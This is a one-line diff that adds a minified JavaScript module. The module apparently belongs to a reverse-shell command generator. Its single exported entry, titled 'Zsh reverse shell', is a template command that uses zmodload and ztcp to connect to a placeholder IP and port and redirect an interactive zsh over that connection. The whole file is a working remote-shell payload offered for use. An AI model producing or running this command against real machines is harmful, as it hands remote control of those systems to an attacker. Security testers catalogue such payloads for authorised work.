@@ -1,0 +1,1 @@
+const e=[{title:"Zsh reverse shell",template:"zsh -c 'zmodload zsh/net/tcp && ztcp {ip} {port} && zsh >&$REPLY 2>&$REPLY 0>&$REPLY'",description:"Zsh reverse shell using zmodload and ztcp."}],s={commands:e};export{e as commands,s as default};
